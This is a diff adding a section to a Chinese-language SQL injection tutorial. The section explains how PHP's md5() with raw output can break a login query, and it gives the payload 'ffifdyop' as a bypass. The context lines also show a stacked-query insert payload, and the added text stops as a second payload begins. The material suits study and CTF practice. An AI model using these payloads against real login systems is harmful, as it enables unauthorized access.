@@ -653,7 +653,71 @@ id=1'; insert into users(id,usrenamt,password)
 values(88,'aaa','bbb') #
 ```
 
+***
 
+## <mark style="color:green;">（10）敏感函数MD5的利用</mark>
+
+{% hint style="info" %}
+原始的md5哈希在sql中很危险
+{% endhint %}
+
+首先介绍一下md5（）函数
+
+### <mark style="color:yellow;">①MD5（）语法</mark>
+
+作用就是进行md5加密。下面的string是必填项，规定要计算的字符串。后面的raw是可选项，如果是true，就是代表16字符二进制格式，默认是false，就是32字符16进制数。
+
+```
+md5(string,raw)
+```
+
+### <mark style="color:yellow;">②原理</mark>
+
+md5（）函数的第二个参数，如果第二个参数为true的话，就会返回16字符二进制格式，就是原始值不是16进制，原始值会包含mysql中的特殊字符，因此很危险。
+
+### <mark style="color:yellow;">③利用</mark>
+
+首先介绍漏洞出现的环境
+
+```sql
+SELECT * FROM admin WHERE password='".md5($password,true)."'
+```
+
+如果md5计算后的值经过hex转成字符串之后为"or'xxx'这样的字符串，整个sql就变成了。
+
+```sql
+SELECT * FROM admin WHERE password=''or'6'
+```
+
+这样的话字符串可以绕过。
+
+网上有两个payload
+
+#### <mark style="color:purple;">（1）第一个是</mark>
+
+```
+ffifdyop
+```
+
+他转化为md5之后是
+
+```
+276f722736c95d99e921722cf9ed621c
+```
+
+然后再转化为字符串就成了
+
+```
+'or'6<trash>
+```
+
+就达到了我们的目的。
+
+#### <mark style="color:purple;">（2）第二个是</mark>
+
+```
+129581926211651571912466741651878684928
+```
 
 
 
